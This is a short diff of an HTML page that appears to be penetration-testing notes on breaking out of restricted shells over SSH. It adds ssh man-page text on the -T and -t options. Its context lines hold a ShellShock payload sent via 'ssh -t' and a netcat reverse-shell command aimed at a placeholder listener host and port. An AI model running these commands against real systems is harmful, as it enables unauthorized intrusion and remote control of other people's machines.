@@ -25,4 +25,11 @@ try ShellShock on vulnerable implementations<br/>
 &nbsp;ssh user@server -t "() { :; }; /bin/bash"<br/>
 <br/>
 try to execute other commands such as nc to get full shell<br/>
-&nbsp;ssh user@server nc &lt;LHOST&gt; &lt;LPORT&gt; -e /bin/sh</body></html>
+&nbsp;ssh user@server nc &lt;LHOST&gt; &lt;LPORT&gt; -e /bin/sh<br/>
+<br/>
+-T &nbsp; &nbsp; &nbsp;Disable pseudo-tty allocation.<br/>
+<br/>
+-t &nbsp; &nbsp; &nbsp;Force pseudo-tty allocation. &nbsp;This can be used to execute arbitrary <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; screen-based programs on a remote machine, which can be very useful,<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; e.g. when implementing menu services. &nbsp;Multiple -t options force tty<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; allocation, even if ssh has no local tty. (-tt)</body></html>
